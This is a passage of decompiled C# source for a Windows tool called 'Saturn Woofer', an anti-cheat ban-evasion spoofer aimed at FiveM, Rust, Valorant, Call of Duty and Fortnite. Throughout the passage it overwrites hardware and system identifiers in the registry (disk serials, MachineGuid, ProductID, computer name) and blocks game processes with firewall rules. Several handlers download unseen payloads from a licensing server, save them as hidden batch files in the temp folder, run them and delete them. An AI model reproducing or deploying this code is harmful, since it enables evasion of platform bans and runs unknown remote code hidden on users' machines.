            int num2 = (int) MessageBox.Show("Opening FiveM, you should be unbanned!", "Saturn Woofer - FiveM V2 (BETA)", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            Application.Exit();
          }
          else
            this.Show();
        }
        else if (((Control) this.MethodCB).Text == "FiveM Bypass")
        {
          this.Hide();
          switch (MessageBox.Show("The FiveM-Bypass Method might be patched/detected, want to use it?", "Saturn Woofer", MessageBoxButtons.YesNo))
          {
            case DialogResult.Yes:
              if (Process.GetProcessesByName("FiveM").Length != 0)
              {
                foreach (Process process in Process.GetProcessesByName("FiveM"))
                  process.Kill();
              }
              if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
              {
                Directory.Delete("C:\\Program Files (x86)\\Blade Group");
                Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
              }
              Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
              Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
              new Process()
              {
                StartInfo = new ProcessStartInfo()
                {
                  WindowStyle = ProcessWindowStyle.Hidden,
                  FileName = "cmd.exe",
                  Arguments = ("/C Start Explorer.exe fivem://connect/" + ((TextBox) this.enterip).Text)
                }
              }.Start();
              new Process()
              {
                StartInfo = {
                  FileName = "cmd.exe",
                  CreateNoWindow = true,
                  RedirectStandardInput = true,
                  RedirectStandardOutput = true,
                  UseShellExecute = false,
                  Verb = "runas",
                  Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= yes > nul"
                }
              }.Start();
              this.Hide();
              System.Timers.Timer timer = new System.Timers.Timer(50.0);
              timer.AutoReset = true;
              timer.Elapsed += new ElapsedEventHandler(Main.MyMethod2);
              timer.Start();
              break;
            case DialogResult.No:
              this.Show();
              break;
          }
        }
        else if (((Control) this.MethodCB).Text == "Rust")
        {
          this.DisableMouse();
          string tempPath = Path.GetTempPath();
          byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("203677");
          System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
          System.IO.File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath + this.xynw + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          new Class1().spoofUserMode();
          Main.HWIDclick();
          string str = Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5);
          RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
          registryKey.SetValue("ProductID", (object) str);
          registryKey.Close();
          Main.InstallDate();
          Main.Disk();
          Main.HWIDclick();
          Main.XBOXclick();
          Main.PCclick();
          Main.Diskclick();
          Main.New();
          Main.SpoofPCName();
          string path6 = "C:\\Program Files\\Win64";
          if (!Directory.Exists(path6))
            Directory.CreateDirectory(path6);
          if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
          {
            Process.Start("C:\\Program Files\\Win64\\net.bat");
          }
          else
          {
            string path7 = "C:\\Program Files\\Win64\\net.bat";
            using (StreamWriter text = System.IO.File.CreateText(path7))
              text.WriteLine("netsh int ip reset");
            Process process = new Process();
            process.StartInfo.FileName = path7;
            this.processlist.Add(process);
            System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
            process.Start();
          }
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
          string text1 = ((TextBox) this.diskname).Text;
          string path8 = "C:\\Program Files\\Unlisted";
          if (!Directory.Exists(path8))
            Directory.CreateDirectory(path8);
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
          {
            string path9 = "C:\\Program Files\\Unlisted\\change.bat";
            using (StreamWriter text2 = System.IO.File.CreateText(path9))
              text2.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
            Process process = new Process();
            process.StartInfo.FileName = path9;
            this.processlist.Add(process);
            System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
            process.Start();
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
            Directory.Delete(path8);
          }
          else
          {
            System.IO.File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", Saturn.Forms.Saturn.KeyAuthApp.download("558460"));
            System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
            Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
            Thread.Sleep(500);
            string path10 = "C:\\Program Files\\Unlisted\\change.bat";
            using (StreamWriter text3 = System.IO.File.CreateText(path10))
              text3.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
            Process process = new Process();
            process.StartInfo.FileName = path10;
            this.processlist.Add(process);
            System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
            process.Start();
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
            Directory.Delete(path8);
          }
          this.EnableMouse();
          int num3 = (int) MessageBox.Show("Spoofed Rust!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else if (((Control) this.MethodCB).Text == "Valorant")
        {
          this.DisableMouse();
          string tempPath = Path.GetTempPath();
          byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("479255");
          System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
          System.IO.File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath + this.xynw + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
          {
            foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
            {
              RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
              if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
              {
                string s1 = Main.RandomId(14);
                string s2 = Main.RandomId(14);
                registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
                registryKey.SetValue("Identifier", (object) s1);
                registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
                registryKey.SetValue("SerialNumber", (object) s2);
              }
            }
            RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
            registryKey1.SetValue("ComputerName", (object) ("DESKTOP-" + Main.GenerateString(6)));
            registryKey1.Close();
            Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5);
            Main.HWIDclick();
            this.DisableMouse();
            int num4 = (int) MessageBox.Show("Valorant Spoofed, New ID: " + Main.CurrentProductID(), "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          }
        }
        else if (((Control) this.MethodCB).Text == "Call Of Duty")
        {
          this.DisableMouse();
          string tempPath1 = Path.GetTempPath();
          byte[] bytes1 = Saturn.Forms.Saturn.KeyAuthApp.download("319355");
          System.IO.File.WriteAllBytes(tempPath1 + this.xynw + ".bat", bytes1);
          System.IO.File.SetAttributes(tempPath1 + this.xynw + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath1 + this.xynw + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          new Class1().spoofUserMode();
          Main.HWIDclick();
          string str = Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5);
          RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
          registryKey.SetValue("ProductID", (object) str);
          registryKey.Close();
          Main.InstallDate();
          Main.Disk();
          Main.HWIDclick();
          Main.XBOXclick();
          Main.PCclick();
          Main.Diskclick();
          Main.New();
          Main.SpoofPCName();
          string tempPath2 = Path.GetTempPath();
          byte[] bytes2 = Saturn.Forms.Saturn.KeyAuthApp.download("075553");
          System.IO.File.WriteAllBytes(tempPath2 + this.xynw + ".bat", bytes2);
          System.IO.File.SetAttributes(tempPath2 + this.xynw + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath2 + this.xynw + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          string path11 = "C:\\Program Files\\Win64";
          if (!Directory.Exists(path11))
            Directory.CreateDirectory(path11);
          string tempPath3 = Path.GetTempPath();
          byte[] bytes3 = Saturn.Forms.Saturn.KeyAuthApp.download("743506");
          System.IO.File.WriteAllBytes(tempPath3 + this.xynw + ".bat", bytes3);
          System.IO.File.SetAttributes(tempPath3 + this.xynw + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath3 + this.xynw + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
          {
            Process.Start("C:\\Program Files\\Win64\\net.bat");
          }
          else
          {
            string path12 = "C:\\Program Files\\Win64\\net.bat";
            using (StreamWriter text = System.IO.File.CreateText(path12))
              text.WriteLine("netsh int ip reset");
            Process process = new Process();
            process.StartInfo.FileName = path12;
            this.processlist.Add(process);
            System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
            process.Start();
          }
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
          string text4 = ((TextBox) this.diskname).Text;
          string path13 = "C:\\Program Files\\Unlisted";
          if (!Directory.Exists(path13))
            Directory.CreateDirectory(path13);
          if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
          {
            string path14 = "C:\\Program Files\\Unlisted\\change.bat";
            using (StreamWriter text5 = System.IO.File.CreateText(path14))
              text5.WriteLine("Volumeid.exe " + text4 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
            Process process = new Process();
            process.StartInfo.FileName = path14;
            this.processlist.Add(process);
            System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
            process.Start();
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
            Directory.Delete(path13);
          }
          else
          {
            System.IO.File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", Saturn.Forms.Saturn.KeyAuthApp.download("558460"));
            System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
            Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
            Thread.Sleep(500);
            string path15 = "C:\\Program Files\\Unlisted\\change.bat";
            using (StreamWriter text6 = System.IO.File.CreateText(path15))
              text6.WriteLine("Volumeid.exe " + text4 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
            Process process = new Process();
            process.StartInfo.FileName = path15;
            this.processlist.Add(process);
            System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
            process.Start();
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
            System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
            Directory.Delete(path13);
          }
          this.EnableMouse();
          int num5 = (int) MessageBox.Show("Spoofed Call Of Duty!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else if (((Control) this.MethodCB).Text == "Fortnite")
        {
          this.DisableMouse();
          string tempPath4 = Path.GetTempPath();
          byte[] bytes4 = Saturn.Forms.Saturn.KeyAuthApp.download("299894");
          System.IO.File.WriteAllBytes(tempPath4 + this.xynw + ".bat", bytes4);
          System.IO.File.SetAttributes(tempPath4 + this.xynw + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath4 + this.xynw + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          string tempPath5 = Path.GetTempPath();
          byte[] bytes5 = Saturn.Forms.Saturn.KeyAuthApp.download("203677");
          System.IO.File.WriteAllBytes(tempPath5 + this.xynw + ".bat", bytes5);
          System.IO.File.SetAttributes(tempPath5 + this.xynw + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath5 + this.xynw + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          string tempPath6 = Path.GetTempPath();
          byte[] bytes6 = Saturn.Forms.Saturn.KeyAuthApp.download("639184");
          System.IO.File.WriteAllBytes(tempPath6 + this.xynw + ".bat", bytes6);
          System.IO.File.SetAttributes(tempPath6 + this.xynw + ".bat", FileAttributes.Hidden);
          Process.Start(tempPath6 + this.xynw + ".bat");
          Thread.Sleep(2500);
          this.xynwbyzia();
          this.EnableMouse();
          int num6 = (int) MessageBox.Show("Fortnite Spoofed!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          int num7 = (int) MessageBox.Show("Please Select A Game!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
      }
      catch
      {
      }
    }

    private void siticoneGradientButton3_Click_1(object sender, EventArgs e) => ((Control) this.gamepanel).BringToFront();

    private void siticoneGradientButton4_Click_1(object sender, EventArgs e) => ((Control) this.settingspanel).BringToFront();

    private void gamepanel_Paint(object sender, PaintEventArgs e)
    {
    }

    private void MethodCB_SelectedIndexChanged_1(object sender, EventArgs e)
    {
      if (((Control) this.MethodCB).Text == "FiveM Bypass")
      {
        ((Control) this.textip).Show();
        ((Control) this.enterip).Show();
      }
      else
      {
        ((Control) this.textip).Hide();
        ((Control) this.enterip).Hide();
      }
    }

    public static void SpoofHwProfileGUID()
    {
      string str = "{" + Guid.NewGuid().ToString() + "}";
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", true);
      registryKey.SetValue("HwProfileGUID", (object) str);
      registryKey.Close();
    }

    private void siticoneRoundedButton1_Click(object sender, EventArgs e)
    {
      Main.HWIDclick();
      Main.SpoofHwProfileGUID();
      Main.SpoofGUID();
      int num = (int) MessageBox.Show("Spoofed HWID!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static void SpoofGUID()
    {
      string str = Guid.NewGuid().ToString();
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true).SetValue("MachineGuid", (object) str);
    }

    public void xynwbyzia()
    {
      string tempPath = Path.GetTempPath();
      if (Process.GetProcessesByName(this.xynw + ".bat").Length == 0)
      {
        System.IO.File.Delete(tempPath + this.xynw + ".bat");
      }
      else
      {
        Thread.Sleep(5000);
        this.xynwbyzia();
      }
    }

    public static string GenerateDate(int size)
    {
      char[] chArray = new char[size];
      for (int index = 0; index < size; ++index)
        chArray[index] = "abcdef0123456789"[Main.random.Next("abcdef0123456789".Length)];
      return new string(chArray);
    }

    private void siticoneRoundedButton7_Click(object sender, EventArgs e)
    {
      string date = Main.GenerateDate(8);
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("InstallDate", (object) date);
      registryKey.Close();
      string tempPath = Path.GetTempPath();
      byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("299894");
      System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
      System.IO.File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
      Process.Start(tempPath + this.xynw + ".bat");
      Thread.Sleep(2500);
      this.xynwbyzia();
      int num = (int) MessageBox.Show("Logs Spoofed!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    private void siticoneRoundedButton4_Click(object sender, EventArgs e)
    {
      string tempPath = Path.GetTempPath();
      byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("358697");
      System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
      Process.Start(tempPath + this.xynw + ".bat");
      Thread.Sleep(2500);
      this.xynwbyzia();
      int num = (int) MessageBox.Show("Mac Spoofed!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    private void siticoneRoundedButton2_Click(object sender, EventArgs e)
    {
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", (object) "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", (object) "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", (object) "1");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", (object) "2000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "2000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 1, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", (object) 6, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", (object) 0, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", (object) "Medium", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "0", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "400");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "400");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
